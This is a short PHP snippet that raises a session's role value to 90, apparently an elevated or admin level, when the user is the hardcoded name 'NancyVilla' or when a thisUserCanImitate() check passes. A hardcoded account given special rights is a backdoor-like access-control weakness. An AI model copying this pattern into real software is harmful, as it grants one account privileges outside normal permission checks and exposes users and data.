<?php
$_SESSION['init']['user']=1;
$user=getuser();
if( $user=='NancyVilla' || thisUserCanImitate() ) {
	$_SESSION['user']['umrole']=90;
}
?>